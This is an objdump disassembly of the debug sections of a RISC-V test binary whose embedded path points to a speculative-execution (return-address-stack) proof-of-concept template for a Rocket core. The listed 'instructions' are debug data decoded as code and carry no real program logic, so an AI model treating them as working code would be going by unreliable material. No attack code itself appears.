 1d8:	1201                	.2byte	0x1201
 1da:	7c184007          	.4byte	0x7c184007
 1de:	0119                	.2byte	0x119
 1e0:	18000013          	li	zero,384
 1e4:	000a                	.2byte	0xa
 1e6:	213a0e03          	lb	t3,531(s4)
 1ea:	3b02                	.2byte	0x3b02
 1ec:	110b390b          	.4byte	0x110b390b
 1f0:	0001                	.2byte	0x1
 1f2:	1900                	.2byte	0x1900
 1f4:	000a                	.2byte	0xa
 1f6:	213a0e03          	lb	t3,531(s4)
 1fa:	3b02                	.2byte	0x3b02
 1fc:	3905                	.2byte	0x3905
 1fe:	0521                	.2byte	0x521
 200:	0111                	.2byte	0x111
 202:	0000                	.2byte	0x0
 204:	051a                	.2byte	0x51a
 206:	4900                	.2byte	0x4900
 208:	1b000013          	li	zero,432
 20c:	012e                	.2byte	0x12e
 20e:	0e03193f 3b02213a 	.8byte	0x3b02213a0e03193f
 216:	0621390b          	.4byte	0x621390b
 21a:	01111927          	.4byte	0x1111927
 21e:	0712                	.2byte	0x712
 220:	1840                	.2byte	0x1840
 222:	197c                	.2byte	0x197c
 224:	1301                	.2byte	0x1301
 226:	0000                	.2byte	0x0
 228:	341c                	.2byte	0x341c
 22a:	0300                	.2byte	0x300
 22c:	3a0e                	.2byte	0x3a0e
 22e:	390b3b0b          	.4byte	0x390b3b0b
 232:	1721                	.2byte	0x1721
 234:	1349                	.2byte	0x1349
 236:	0000                	.2byte	0x0
 238:	2e1d                	.2byte	0x2e1d
 23a:	0301                	.2byte	0x301
 23c:	3a0e                	.2byte	0x3a0e
 23e:	0121                	.2byte	0x121
 240:	0b390b3b          	.4byte	0xb390b3b
 244:	01111927          	.4byte	0x1111927
 248:	0712                	.2byte	0x712
 24a:	1840                	.2byte	0x1840
 24c:	197a                	.2byte	0x197a
 24e:	1301                	.2byte	0x1301
 250:	0000                	.2byte	0x0
 252:	111e                	.2byte	0x111e
 254:	2501                	.2byte	0x2501
 256:	130e                	.2byte	0x130e
 258:	1b1f030b          	.4byte	0x1b1f030b
 25c:	111f 1201 1007      	.byte	0x1f, 0x11, 0x01, 0x12, 0x07, 0x10
 262:	1f000017          	auipc	zero,0x1f000
 266:	0024                	.2byte	0x24
 268:	0b3e0b0b          	.4byte	0xb3e0b0b
 26c:	00000803          	lb	a6,0(zero) # 0 <threadsense.5>
 270:	0f20                	.2byte	0xf20
 272:	0b00                	.2byte	0xb00
 274:	2100000b          	.4byte	0x2100000b
 278:	0b0b000f          	.4byte	0xb0b000f
 27c:	00000e03          	lb	t3,0(zero) # 0 <threadsense.5>
 280:	2e22                	.2byte	0x2e22
 282:	3f01                	.2byte	0x3f01
 284:	0319                	.2byte	0x319
 286:	3a0e                	.2byte	0x3a0e
 288:	39053b0b          	.4byte	0x39053b0b
 28c:	4919270b          	.4byte	0x4919270b
 290:	12011113          	.4byte	0x12011113
 294:	7a184007          	.4byte	0x7a184007
 298:	0119                	.2byte	0x119
 29a:	23000013          	li	zero,560
 29e:	0026                	.2byte	0x26
 2a0:	0000                	.2byte	0x0
 2a2:	2e24                	.2byte	0x2e24
 2a4:	0301                	.2byte	0x301
 2a6:	3a0e                	.2byte	0x3a0e
 2a8:	39053b0b          	.4byte	0x39053b0b
 2ac:	1119270b          	.4byte	0x1119270b
 2b0:	1201                	.2byte	0x1201
 2b2:	48184007          	.4byte	0x48184007
 2b6:	7a18                	.2byte	0x7a18
 2b8:	0019                	.2byte	0x19
 2ba:	2500                	.2byte	0x2500
 2bc:	0034                	.2byte	0x34
 2be:	0b3a0803          	lb	a6,179(s4)
 2c2:	0b390b3b          	.4byte	0xb390b3b
 2c6:	1349                	.2byte	0x1349
 2c8:	0000                	.2byte	0x0
 2ca:	1526                	.2byte	0x1526
 2cc:	2701                	.2byte	0x2701
 2ce:	0119                	.2byte	0x119
 2d0:	27000013          	li	zero,624
 2d4:	0034                	.2byte	0x34
 2d6:	0b3a0803          	lb	a6,179(s4)
 2da:	0b390b3b          	.4byte	0xb390b3b
 2de:	1349                	.2byte	0x1349
 2e0:	0188                	.2byte	0x188
 2e2:	2800000b          	.4byte	0x2800000b
 2e6:	002e                	.2byte	0x2e
 2e8:	0e03193f 0b3b0b3a 	.8byte	0xb3b0b3a0e03193f
 2f0:	0b39                	.2byte	0xb39
 2f2:	0111                	.2byte	0x111
 2f4:	0712                	.2byte	0x712
 2f6:	1840                	.2byte	0x1840
 2f8:	197c                	.2byte	0x197c
 2fa:	0000                	.2byte	0x0
 2fc:	2e29                	.2byte	0x2e29
 2fe:	3f01                	.2byte	0x3f01
 300:	0319                	.2byte	0x319
 302:	3a0e                	.2byte	0x3a0e
 304:	390b3b0b          	.4byte	0x390b3b0b
 308:	8719270b          	.4byte	0x8719270b
 30c:	1901                	.2byte	0x1901
 30e:	0111                	.2byte	0x111
 310:	0712                	.2byte	0x712
 312:	1840                	.2byte	0x1840
 314:	197c                	.2byte	0x197c
 316:	1301                	.2byte	0x1301
 318:	0000                	.2byte	0x0
 31a:	2e2a                	.2byte	0x2e2a
 31c:	3f01                	.2byte	0x3f01
 31e:	0319                	.2byte	0x319
 320:	3a0e                	.2byte	0x3a0e
 322:	390b3b0b          	.4byte	0x390b3b0b
 326:	8719270b          	.4byte	0x8719270b
 32a:	1901                	.2byte	0x1901
 32c:	0111                	.2byte	0x111
 32e:	0712                	.2byte	0x712
 330:	1840                	.2byte	0x1840
 332:	197a                	.2byte	0x197a
 334:	1301                	.2byte	0x1301
 336:	0000                	.2byte	0x0
 338:	0300342b          	.4byte	0x300342b
 33c:	3a0e                	.2byte	0x3a0e
 33e:	390b3b0b          	.4byte	0x390b3b0b
 342:	8813490b          	.4byte	0x8813490b
 346:	0b01                	.2byte	0xb01
 348:	1802                	.2byte	0x1802
 34a:	0000                	.2byte	0x0
 34c:	2e2c                	.2byte	0x2e2c
 34e:	0301                	.2byte	0x301
 350:	3a0e                	.2byte	0x3a0e
 352:	390b3b0b          	.4byte	0x390b3b0b
 356:	1119270b          	.4byte	0x1119270b
 35a:	1201                	.2byte	0x1201
 35c:	7a184007          	.4byte	0x7a184007
 360:	0019                	.2byte	0x19
 362:	0000                	.2byte	0x0
 364:	2401                	.2byte	0x2401
 366:	0b00                	.2byte	0xb00
 368:	030b3e0b          	.4byte	0x30b3e0b
 36c:	000e                	.2byte	0xe
 36e:	0200                	.2byte	0x200
 370:	0016                	.2byte	0x16
 372:	0b3a0e03          	lb	t3,179(s4)
 376:	0b390b3b          	.4byte	0xb390b3b
 37a:	1349                	.2byte	0x1349
 37c:	0000                	.2byte	0x0
 37e:	49010103          	lb	sp,1168(sp) # b496 <threadsense.2+0xb412>
 382:	00130113          	add	sp,t1,1
 386:	0400                	.2byte	0x400
 388:	0034                	.2byte	0x34
 38a:	213a0e03          	lb	t3,531(s4)
 38e:	3b01                	.2byte	0x3b01
 390:	0f21390b          	.4byte	0xf21390b
 394:	1349                	.2byte	0x1349
 396:	1802                	.2byte	0x1802
 398:	0000                	.2byte	0x0
 39a:	1105                	.2byte	0x1105
 39c:	2501                	.2byte	0x2501
 39e:	130e                	.2byte	0x130e
 3a0:	1b1f030b          	.4byte	0x1b1f030b
 3a4:	111f 1201 1007      	.byte	0x1f, 0x11, 0x01, 0x12, 0x07, 0x10
 3aa:	06000017          	auipc	zero,0x6000
 3ae:	0024                	.2byte	0x24
 3b0:	0b3e0b0b          	.4byte	0xb3e0b0b
 3b4:	00000803          	lb	a6,0(zero) # 0 <threadsense.5>
 3b8:	00002107          	flw	ft2,0(zero) # 0 <threadsense.5>
 3bc:	0800                	.2byte	0x800
 3be:	0034                	.2byte	0x34
 3c0:	0b3a0e03          	lb	t3,179(s4)
 3c4:	0b390b3b          	.4byte	0xb390b3b
 3c8:	1349                	.2byte	0x1349
 3ca:	193c193f 21090000 	.8byte	0x21090000193c193f
 3d2:	4900                	.2byte	0x4900
 3d4:	000b2f13          	slti	t5,s6,0
 3d8:	0a00                	.2byte	0xa00
 3da:	0021                	.2byte	0x21
 3dc:	1349                	.2byte	0x1349
 3de:	0000052f          	.4byte	0x52f
 3e2:	0300340b          	.4byte	0x300340b
 3e6:	3a08                	.2byte	0x3a08
 3e8:	390b3b0b          	.4byte	0x390b3b0b
 3ec:	3f13490b          	.4byte	0x3f13490b
 3f0:	8819                	.2byte	0x8819
 3f2:	0501                	.2byte	0x501
 3f4:	1802                	.2byte	0x1802
 3f6:	0000                	.2byte	0x0
 3f8:	2e0c                	.2byte	0x2e0c
 3fa:	3f01                	.2byte	0x3f01
 3fc:	0319                	.2byte	0x319
 3fe:	3a0e                	.2byte	0x3a0e
 400:	390b3b0b          	.4byte	0x390b3b0b
 404:	01193c0b          	.4byte	0x1193c0b
 408:	0d000013          	li	zero,208
 40c:	0018                	.2byte	0x18
 40e:	0000                	.2byte	0x0
 410:	2e0e                	.2byte	0x2e0e
 412:	3f01                	.2byte	0x3f01
 414:	0319                	.2byte	0x319
 416:	3a0e                	.2byte	0x3a0e
 418:	390b3b0b          	.4byte	0x390b3b0b
 41c:	1201110b          	.4byte	0x1201110b
 420:	7a184007          	.4byte	0x7a184007
 424:	0119                	.2byte	0x119
 426:	0f000013          	li	zero,240
 42a:	012e                	.2byte	0x12e
 42c:	0b3a0e03          	lb	t3,179(s4)
 430:	0b390b3b          	.4byte	0xb390b3b
 434:	13491927          	.4byte	0x13491927
 438:	0111                	.2byte	0x111
 43a:	0712                	.2byte	0x712
 43c:	1840                	.2byte	0x1840
 43e:	197a                	.2byte	0x197a
 440:	0000                	.2byte	0x0
 442:	0510                	.2byte	0x510
 444:	0300                	.2byte	0x300
 446:	3a08                	.2byte	0x3a08
 448:	390b3b0b          	.4byte	0x390b3b0b
 44c:	0213490b          	.4byte	0x213490b
 450:	0018                	.2byte	0x18
 452:	1100                	.2byte	0x1100
 454:	0034                	.2byte	0x34
 456:	0b3a0803          	lb	a6,179(s4)
 45a:	0b390b3b          	.4byte	0xb390b3b
 45e:	1349                	.2byte	0x1349
 460:	1802                	.2byte	0x1802
 462:	0000                	.2byte	0x0
 464:	0100                	.2byte	0x100
 466:	0034                	.2byte	0x34
 468:	0b3a0803          	lb	a6,179(s4)
 46c:	0b390b3b          	.4byte	0xb390b3b
 470:	1349                	.2byte	0x1349
 472:	1802                	.2byte	0x1802
 474:	0000                	.2byte	0x0
 476:	3402                	.2byte	0x3402
 478:	0300                	.2byte	0x300
 47a:	3a0e                	.2byte	0x3a0e
 47c:	390b3b0b          	.4byte	0x390b3b0b
 480:	0213490b          	.4byte	0x213490b
 484:	0018                	.2byte	0x18
 486:	0300                	.2byte	0x300
 488:	0024                	.2byte	0x24
 48a:	0b3e0b0b          	.4byte	0xb3e0b0b
 48e:	00000e03          	lb	t3,0(zero) # 0 <threadsense.5>
 492:	0504                	.2byte	0x504
 494:	0300                	.2byte	0x300
 496:	3a08                	.2byte	0x3a08
 498:	390b3b0b          	.4byte	0x390b3b0b
 49c:	0213490b          	.4byte	0x213490b
 4a0:	0018                	.2byte	0x18
 4a2:	0500                	.2byte	0x500
 4a4:	0005                	.2byte	0x5
 4a6:	0b3a0e03          	lb	t3,179(s4)
 4aa:	0b390b3b          	.4byte	0xb390b3b
 4ae:	1349                	.2byte	0x1349
 4b0:	1802                	.2byte	0x1802
 4b2:	0000                	.2byte	0x0
 4b4:	0f06                	.2byte	0xf06
 4b6:	0b00                	.2byte	0xb00
 4b8:	0821                	.2byte	0x821
 4ba:	1349                	.2byte	0x1349
 4bc:	0000                	.2byte	0x0
 4be:	11010b07          	.4byte	0x11010b07
 4c2:	1201                	.2byte	0x1201
 4c4:	08000007          	.4byte	0x8000007
 4c8:	0016                	.2byte	0x16
 4ca:	0b3a0e03          	lb	t3,179(s4)
 4ce:	0b390b3b          	.4byte	0xb390b3b
 4d2:	1349                	.2byte	0x1349
 4d4:	0000                	.2byte	0x0
 4d6:	2609                	.2byte	0x2609
 4d8:	4900                	.2byte	0x4900
 4da:	0a000013          	li	zero,160
 4de:	0101                	.2byte	0x101
 4e0:	1349                	.2byte	0x1349
 4e2:	1301                	.2byte	0x1301
 4e4:	0000                	.2byte	0x0
 4e6:	03012e0b          	.4byte	0x3012e0b
 4ea:	3a0e                	.2byte	0x3a0e
 4ec:	0121                	.2byte	0x121
 4ee:	0b390b3b          	.4byte	0xb390b3b
 4f2:	13491927          	.4byte	0x13491927
 4f6:	0111                	.2byte	0x111
 4f8:	0712                	.2byte	0x712
 4fa:	1840                	.2byte	0x1840
 4fc:	197a                	.2byte	0x197a
 4fe:	1301                	.2byte	0x1301
 500:	0000                	.2byte	0x0
 502:	350c                	.2byte	0x350c
 504:	4900                	.2byte	0x4900
 506:	0d000013          	li	zero,208
 50a:	0021                	.2byte	0x21
 50c:	1349                	.2byte	0x1349
 50e:	00000b2f          	.4byte	0xb2f
 512:	2e0e                	.2byte	0x2e0e
 514:	3f01                	.2byte	0x3f01
 516:	0319                	.2byte	0x319
 518:	3a0e                	.2byte	0x3a0e
 51a:	0221                	.2byte	0x221
 51c:	0b390b3b          	.4byte	0xb390b3b
 520:	13491927          	.4byte	0x13491927
 524:	0111                	.2byte	0x111
 526:	0712                	.2byte	0x712
 528:	1840                	.2byte	0x1840
 52a:	197c                	.2byte	0x197c
 52c:	1301                	.2byte	0x1301
 52e:	0000                	.2byte	0x0
 530:	03012e0f          	.4byte	0x3012e0f
 534:	3a0e                	.2byte	0x3a0e
 536:	0121                	.2byte	0x121
 538:	0b390b3b          	.4byte	0xb390b3b
 53c:	01111927          	.4byte	0x1111927
 540:	0712                	.2byte	0x712
 542:	1840                	.2byte	0x1840
 544:	197a                	.2byte	0x197a
 546:	1301                	.2byte	0x1301
 548:	0000                	.2byte	0x0
 54a:	1110                	.2byte	0x1110
 54c:	2501                	.2byte	0x2501
 54e:	130e                	.2byte	0x130e
 550:	1b1f030b          	.4byte	0x1b1f030b
 554:	551f 1117 1001      	.byte	0x1f, 0x55, 0x17, 0x11, 0x01, 0x10
 55a:	11000017          	auipc	zero,0x11000
 55e:	0024                	.2byte	0x24
 560:	0b3e0b0b          	.4byte	0xb3e0b0b
 564:	00000803          	lb	a6,0(zero) # 0 <threadsense.5>
 568:	3712                	.2byte	0x3712
 56a:	4900                	.2byte	0x4900
 56c:	13000013          	li	zero,304
 570:	0021                	.2byte	0x21
 572:	0000                	.2byte	0x0
 574:	3414                	.2byte	0x3414
 576:	0300                	.2byte	0x300
 578:	3a0e                	.2byte	0x3a0e
 57a:	390b3b0b          	.4byte	0x390b3b0b
 57e:	3f13490b          	.4byte	0x3f13490b
 582:	3c19                	.2byte	0x3c19
 584:	0019                	.2byte	0x19
 586:	1500                	.2byte	0x1500
 588:	0034                	.2byte	0x34
 58a:	0b3a0e03          	lb	t3,179(s4)
 58e:	0b390b3b          	.4byte	0xb390b3b
 592:	1349                	.2byte	0x1349
 594:	1802193f 2e160000 	.8byte	0x2e1600001802193f
 59c:	3f01                	.2byte	0x3f01
 59e:	0319                	.2byte	0x319
 5a0:	3a0e                	.2byte	0x3a0e
 5a2:	390b3b0b          	.4byte	0x390b3b0b
 5a6:	4919270b          	.4byte	0x4919270b
 5aa:	01193c13          	sltiu	s8,s2,17
 5ae:	17000013          	li	zero,368
 5b2:	0005                	.2byte	0x5
 5b4:	1349                	.2byte	0x1349
 5b6:	0000                	.2byte	0x0
 5b8:	1818                	.2byte	0x1818
 5ba:	0000                	.2byte	0x0
 5bc:	1900                	.2byte	0x1900
 5be:	0111010b          	.4byte	0x111010b
 5c2:	0712                	.2byte	0x712
 5c4:	1301                	.2byte	0x1301
 5c6:	0000                	.2byte	0x0
 5c8:	2e1a                	.2byte	0x2e1a
 5ca:	3f00                	.2byte	0x3f00
 5cc:	0319                	.2byte	0x319
 5ce:	3a0e                	.2byte	0x3a0e
 5d0:	390b3b0b          	.4byte	0x390b3b0b
 5d4:	1201110b          	.4byte	0x1201110b
 5d8:	7c184007          	.4byte	0x7c184007
 5dc:	0019                	.2byte	0x19
 5de:	1b00                	.2byte	0x1b00
 5e0:	012e                	.2byte	0x12e
 5e2:	0e03193f 0b3b0b3a 	.8byte	0xb3b0b3a0e03193f
 5ea:	0b39                	.2byte	0xb39
 5ec:	01111927          	.4byte	0x1111927
 5f0:	0712                	.2byte	0x712
 5f2:	1840                	.2byte	0x1840
 5f4:	197c                	.2byte	0x197c
 5f6:	1301                	.2byte	0x1301
 5f8:	0000                	.2byte	0x0
 5fa:	341c                	.2byte	0x341c
 5fc:	0300                	.2byte	0x300
 5fe:	3a0e                	.2byte	0x3a0e
 600:	390b3b0b          	.4byte	0x390b3b0b
 604:	0013490b          	.4byte	0x13490b
 608:	1d00                	.2byte	0x1d00
 60a:	012e                	.2byte	0x12e
 60c:	0b3a0e03          	lb	t3,179(s4)
 610:	0b390b3b          	.4byte	0xb390b3b
 614:	01111927          	.4byte	0x1111927
 618:	0712                	.2byte	0x712
 61a:	1840                	.2byte	0x1840
 61c:	197a                	.2byte	0x197a
 61e:	0000                	.2byte	0x0
	...

Disassembly of section .debug_aranges:

0000000000000000 <.debug_aranges>:
   0:	003c                	.2byte	0x3c
   2:	0000                	.2byte	0x0
   4:	0002                	.2byte	0x2
   6:	0000                	.2byte	0x0
   8:	0000                	.2byte	0x0
   a:	0008                	.2byte	0x8
   c:	0000                	.2byte	0x0
   e:	0000                	.2byte	0x0
  10:	0000                	.2byte	0x0
  12:	8000                	.2byte	0x8000
  14:	0000                	.2byte	0x0
  16:	0000                	.2byte	0x0
  18:	01c0                	.2byte	0x1c0
	...
  22:	8020                	.2byte	0x8020
  24:	0000                	.2byte	0x0
  26:	0000                	.2byte	0x0
  28:	0010                	.2byte	0x10
	...
  3e:	0000                	.2byte	0x0
  40:	002c                	.2byte	0x2c
  42:	0000                	.2byte	0x0
  44:	0002                	.2byte	0x2
  46:	00000023          	sb	zero,0(zero) # 0 <threadsense.5>
  4a:	0008                	.2byte	0x8
  4c:	0000                	.2byte	0x0
  4e:	0000                	.2byte	0x0
  50:	1048                	.2byte	0x1048
  52:	8000                	.2byte	0x8000
  54:	0000                	.2byte	0x0
  56:	0000                	.2byte	0x0
  58:	0058                	.2byte	0x58
	...
  6e:	0000                	.2byte	0x0
  70:	002c                	.2byte	0x2c
  72:	0000                	.2byte	0x0
  74:	0002                	.2byte	0x2
  76:	000000d7          	.4byte	0xd7
  7a:	0008                	.2byte	0x8
  7c:	0000                	.2byte	0x0
  7e:	0000                	.2byte	0x0
  80:	10a0                	.2byte	0x10a0
  82:	8000                	.2byte	0x8000
  84:	0000                	.2byte	0x0
  86:	0000                	.2byte	0x0
  88:	146c                	.2byte	0x146c
	...
  9e:	0000                	.2byte	0x0
  a0:	002c                	.2byte	0x2c
  a2:	0000                	.2byte	0x0
  a4:	0002                	.2byte	0x2
  a6:	0d6d                	.2byte	0xd6d
  a8:	0000                	.2byte	0x0
  aa:	0008                	.2byte	0x8
  ac:	0000                	.2byte	0x0
  ae:	0000                	.2byte	0x0
  b0:	250c                	.2byte	0x250c
  b2:	8000                	.2byte	0x8000
  b4:	0000                	.2byte	0x0
  b6:	0000                	.2byte	0x0
  b8:	0180                	.2byte	0x180
	...
  ce:	0000                	.2byte	0x0
  d0:	006c                	.2byte	0x6c
  d2:	0000                	.2byte	0x0
  d4:	0002                	.2byte	0x2
  d6:	00000eef          	jal	t4,d6 <threadsense.2+0x52>
  da:	0008                	.2byte	0x8
  dc:	0000                	.2byte	0x0
  de:	0000                	.2byte	0x0
  e0:	268c                	.2byte	0x268c
  e2:	8000                	.2byte	0x8000
  e4:	0000                	.2byte	0x0
  e6:	0000                	.2byte	0x0
  e8:	0498                	.2byte	0x498
  ea:	0000                	.2byte	0x0
  ec:	0000                	.2byte	0x0
  ee:	0000                	.2byte	0x0
  f0:	0010                	.2byte	0x10
  f2:	8020                	.2byte	0x8020
  f4:	0000                	.2byte	0x0
  f6:	0000                	.2byte	0x0
  f8:	00c4                	.2byte	0xc4
  fa:	0000                	.2byte	0x0
  fc:	0000                	.2byte	0x0
  fe:	0000                	.2byte	0x0
 100:	00d4                	.2byte	0xd4
 102:	8020                	.2byte	0x8020
 104:	0000                	.2byte	0x0
 106:	0000                	.2byte	0x0
 108:	0028                	.2byte	0x28
 10a:	0000                	.2byte	0x0
 10c:	0000                	.2byte	0x0
 10e:	0000                	.2byte	0x0
 110:	00fc                	.2byte	0xfc
 112:	8020                	.2byte	0x8020
 114:	0000                	.2byte	0x0
 116:	0000                	.2byte	0x0
 118:	0070                	.2byte	0x70
 11a:	0000                	.2byte	0x0
 11c:	0000                	.2byte	0x0
 11e:	0000                	.2byte	0x0
 120:	016c                	.2byte	0x16c
 122:	8020                	.2byte	0x8020
 124:	0000                	.2byte	0x0
 126:	0000                	.2byte	0x0
 128:	02bc                	.2byte	0x2bc
	...

Disassembly of section .debug_str:

0000000000000000 <.debug_str>:
   0:	2f637273          	csrrc	tp,0x2f6,6
   4:	6e65                	.2byte	0x6e65
   6:	7274                	.2byte	0x7274
   8:	2e79                	.2byte	0x2e79
   a:	6d2f0053          	.4byte	0x6d2f0053
   e:	746e                	.2byte	0x746e
  10:	6c696d2f          	.4byte	0x6c696d2f
  14:	7365                	.2byte	0x7365
  16:	6e61                	.2byte	0x6e61
  18:	6d2d                	.2byte	0x6d2d
  1a:	7465                	.2byte	0x7465
  1c:	2f61                	.2byte	0x2f61
  1e:	6f70                	.2byte	0x6f70
  20:	732f7363          	bgeu	t5,s2,746 <threadsense.2+0x6c2>
  24:	6570                	.2byte	0x6570
  26:	636f6463          	bltu	t5,s6,64e <threadsense.2+0x5ca>
  2a:	6f74                	.2byte	0x6f74
  2c:	2f72                	.2byte	0x2f72
  2e:	6172                	.2byte	0x6172
  30:	74612d73          	csrrs	s10,0x746,sp
  34:	6174                	.2byte	0x6174
  36:	542f6b63          	bltu	t5,sp,58c <threadsense.2+0x508>
  3a:	6d65                	.2byte	0x6d65
  3c:	6c70                	.2byte	0x6c70
  3e:	7461                	.2byte	0x7461
  40:	0065                	.2byte	0x65
  42:	20554e47          	fmsub.s	ft8,fa0,ft5,ft4,rmm
  46:	5341                	.2byte	0x5341
  48:	3220                	.2byte	0x3220
  4a:	342e                	.2byte	0x342e
  4c:	2e30                	.2byte	0x2e30
  4e:	0030                	.2byte	0x30
  50:	6d70                	.2byte	0x6d70
  52:	6370                	.2byte	0x6370
  54:	7000                	.2byte	0x7000
  56:	706d                	.2byte	0x706d
  58:	0061                	.2byte	0x61
  5a:	5f5f 6975 746e      	.byte	0x5f, 0x5f, 0x75, 0x69, 0x6e, 0x74
  60:	7470                	.2byte	0x7470
  62:	5f72                	.2byte	0x5f72
  64:	0074                	.2byte	0x74
  66:	726f6873          	csrrs	a6,mhpmevent6h,30
  6a:	2074                	.2byte	0x2074
  6c:	6e75                	.2byte	0x6e75
  6e:	6e676973          	csrrs	s2,0x6e6,14
  72:	6465                	.2byte	0x6465
  74:	6920                	.2byte	0x6920
  76:	746e                	.2byte	0x746e
  78:	4700                	.2byte	0x4700
  7a:	554e                	.2byte	0x554e
  7c:	4320                	.2byte	0x4320
  7e:	3939                	.2byte	0x3939
  80:	3120                	.2byte	0x3120
  82:	2e32                	.2byte	0x2e32
  84:	2e32                	.2byte	0x2e32
  86:	2030                	.2byte	0x2030
  88:	6d2d                	.2byte	0x6d2d
  8a:	646f6d63          	bltu	t5,t1,6e4 <threadsense.2+0x660>
  8e:	6c65                	.2byte	0x6c65
  90:	6d3d                	.2byte	0x6d3d
  92:	6465                	.2byte	0x6465
  94:	6e61                	.2byte	0x6e61
  96:	2079                	.2byte	0x2079
  98:	6d2d                	.2byte	0x6d2d
  9a:	6261                	.2byte	0x6261
  9c:	3d69                	.2byte	0x3d69
  9e:	706c                	.2byte	0x706c
  a0:	3436                	.2byte	0x3436
  a2:	2d20                	.2byte	0x2d20
  a4:	746d                	.2byte	0x746d
  a6:	6e75                	.2byte	0x6e75
  a8:	3d65                	.2byte	0x3d65
  aa:	6f72                	.2byte	0x6f72
  ac:	74656b63          	bltu	a0,t1,802 <threadsense.2+0x77e>
  b0:	2d20                	.2byte	0x2d20
  b2:	696d                	.2byte	0x696d
  b4:	732d6173          	csrrs	sp,mhpmevent18h,26
  b8:	6570                	.2byte	0x6570
  ba:	30323d63          	.4byte	0x30323d63
  be:	3931                	.2byte	0x3931
  c0:	3231                	.2byte	0x3231
  c2:	3331                	.2byte	0x3331
  c4:	2d20                	.2byte	0x2d20
  c6:	616d                	.2byte	0x616d
  c8:	6372                	.2byte	0x6372
  ca:	3d68                	.2byte	0x3d68
  cc:	7672                	.2byte	0x7672
  ce:	3436                	.2byte	0x3436
  d0:	6d69                	.2byte	0x6d69
  d2:	6661                	.2byte	0x6661
  d4:	5f64                	.2byte	0x5f64
  d6:	697a                	.2byte	0x697a
  d8:	5f727363          	bgeu	tp,s7,6be <threadsense.2+0x63a>
  dc:	697a                	.2byte	0x697a
  de:	6566                	.2byte	0x6566
  e0:	636e                	.2byte	0x636e
  e2:	6965                	.2byte	0x6965
  e4:	2d20                	.2byte	0x2d20
  e6:	4f2d2067          	.4byte	0x4f2d2067
  ea:	2030                	.2byte	0x2030
  ec:	732d                	.2byte	0x732d
  ee:	6474                	.2byte	0x6474
  f0:	673d                	.2byte	0x673d
  f2:	756e                	.2byte	0x756e
  f4:	3939                	.2byte	0x3939
  f6:	2d20                	.2byte	0x2d20
  f8:	6e66                	.2byte	0x6e66
  fa:	6f632d6f          	jal	s10,327f0 <threadsense.2+0x3276c>
  fe:	6d6d                	.2byte	0x6d6d
 100:	2d206e6f          	jal	t3,63d2 <threadsense.2+0x634e>
 104:	6e66                	.2byte	0x6e66
 106:	75622d6f          	jal	s10,2285c <threadsense.2+0x227d8>
 10a:	6c69                	.2byte	0x6c69
 10c:	6974                	.2byte	0x6974
 10e:	2d6e                	.2byte	0x2d6e
 110:	7270                	.2byte	0x7270
 112:	6e69                	.2byte	0x6e69
 114:	6674                	.2byte	0x6674
 116:	7300                	.2byte	0x7300
 118:	6f68                	.2byte	0x6f68
 11a:	7472                	.2byte	0x7472
 11c:	6920                	.2byte	0x6920
 11e:	746e                	.2byte	0x746e
 120:	7500                	.2byte	0x7500
 122:	736e                	.2byte	0x736e
 124:	6769                	.2byte	0x6769
 126:	656e                	.2byte	0x656e
 128:	2064                	.2byte	0x2064
 12a:	72616863          	bltu	sp,t1,85a <threadsense.2+0x7d6>
 12e:	7000                	.2byte	0x7000
 130:	706d                	.2byte	0x706d
 132:	625f 6f6f 0074      	.byte	0x5f, 0x62, 0x6f, 0x6f, 0x74, 0x00
 138:	6e727473          	csrrc	s0,0x6e7,4
 13c:	656c                	.2byte	0x656c
 13e:	006e                	.2byte	0x6e
 140:	7270                	.2byte	0x7270
 142:	7365636f          	jal	t1,56878 <threadsense.2+0x567f4>
 146:	72705f73          	csrrw	t5,mhpmevent7h,0
 14a:	6365                	.2byte	0x6365
 14c:	7369                	.2byte	0x7369
 14e:	6f69                	.2byte	0x6f69
 150:	006e                	.2byte	0x6e
 152:	7562                	.2byte	0x7562
 154:	6c66                	.2byte	0x6c66
 156:	6e65                	.2byte	0x6e65
 158:	7600                	.2byte	0x7600
 15a:	7265                	.2byte	0x7265
 15c:	6669                	.2byte	0x6669
 15e:	0079                	.2byte	0x79
 160:	7270                	.2byte	0x7270
 162:	6e69                	.2byte	0x6e69
 164:	7374                	.2byte	0x7374
 166:	7274                	.2byte	0x7274
 168:	7000                	.2byte	0x7000
 16a:	6461                	.2byte	0x6461
 16c:	69730063          	beq	t1,s7,7ec <threadsense.2+0x768>
 170:	657a                	.2byte	0x657a
 172:	745f 7000 7475      	.byte	0x5f, 0x74, 0x00, 0x70, 0x75, 0x74
 178:	72616863          	bltu	sp,t1,8a8 <threadsense.2+0x824>
 17c:	6400                	.2byte	0x6400
 17e:	6769                	.2byte	0x6769
 180:	666c0073          	.4byte	0x666c0073
 184:	616c                	.2byte	0x616c
 186:	656d0067          	jr	1622(s10)
 18a:	636d                	.2byte	0x636d
 18c:	7970                	.2byte	0x7970
 18e:	6800                	.2byte	0x6800
 190:	6e61                	.2byte	0x6e61
 192:	6c64                	.2byte	0x6c64
 194:	5f65                	.2byte	0x5f65
 196:	7274                	.2byte	0x7274
 198:	7061                	.2byte	0x7061
 19a:	7300                	.2byte	0x7300
 19c:	7274                	.2byte	0x7274
 19e:	0030                	.2byte	0x30
 1a0:	6e75                	.2byte	0x6e75
 1a2:	6e676973          	csrrs	s2,0x6e6,14
 1a6:	6465                	.2byte	0x6465
 1a8:	6e5f 6d75 6562      	.byte	0x5f, 0x6e, 0x75, 0x6d, 0x62, 0x65
 1ae:	0072                	.2byte	0x72
 1b0:	7270                	.2byte	0x7270
 1b2:	6e69                	.2byte	0x6e69
 1b4:	4474                	.2byte	0x4474
 1b6:	6c62756f          	jal	a0,2787c <threadsense.2+0x277f8>
 1ba:	4165                	.2byte	0x4165
 1bc:	7272                	.2byte	0x7272
 1be:	7961                	.2byte	0x7961
 1c0:	7600                	.2byte	0x7600
 1c2:	7270                	.2byte	0x7270
 1c4:	6e69                	.2byte	0x6e69
 1c6:	6674                	.2byte	0x6674
 1c8:	746d                	.2byte	0x746d
 1ca:	7700                	.2byte	0x7700
 1cc:	6469                	.2byte	0x6469
 1ce:	6874                	.2byte	0x6874
 1d0:	7000                	.2byte	0x7000
 1d2:	6972                	.2byte	0x6972
 1d4:	746e                	.2byte	0x746e
 1d6:	7241                	.2byte	0x7241
 1d8:	6172                	.2byte	0x6172
 1da:	0079                	.2byte	0x79
 1dc:	6162                	.2byte	0x6162
 1de:	7272                	.2byte	0x7272
 1e0:	6569                	.2byte	0x6569
 1e2:	0072                	.2byte	0x72
 1e4:	7261                	.2byte	0x7261
 1e6:	73003267          	.4byte	0x73003267
